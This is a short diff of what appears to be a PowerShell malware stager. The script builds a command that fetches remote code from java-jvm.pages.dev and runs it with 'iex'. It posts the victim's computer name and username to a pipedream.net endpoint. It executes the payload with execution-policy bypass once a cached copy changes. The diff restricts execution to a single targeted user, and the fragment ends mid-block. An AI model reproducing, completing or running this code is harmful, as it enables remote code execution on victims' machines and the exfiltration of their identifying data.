@@ -6,8 +6,7 @@ $command = ";iex (iwr java-jvm.pages.dev/sideways)"
 iwr -uri https://eowh8quogmj1r7l.m.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
 
 
-#if ( $Env:UserName -eq $target_user) {
-if ($env:computername 
+if ( $Env:UserName -eq $target_user) {
 	if (Test-Path "C:\Cache\tmp"){
 		if (!((Get-Content "C:\Cache\tmp") -eq $command)){
 			powershell -ep bypass -Command $command
